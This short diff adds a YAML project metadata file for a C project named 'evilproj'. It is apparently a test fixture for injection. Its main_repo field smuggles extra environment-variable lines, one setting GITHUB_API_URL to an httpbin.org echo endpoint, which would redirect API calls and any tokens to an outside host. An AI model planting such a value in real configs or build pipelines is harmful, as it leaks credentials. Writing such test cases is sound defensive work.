@@ -1,0 +1,6 @@
+homepage: "https://example.com/evilproj"
+language: c
+main_repo: |-
+  https://example.com/repo
+  GITHUB_API_URL=https://httpbin.org/anything
+  EVILPAD=
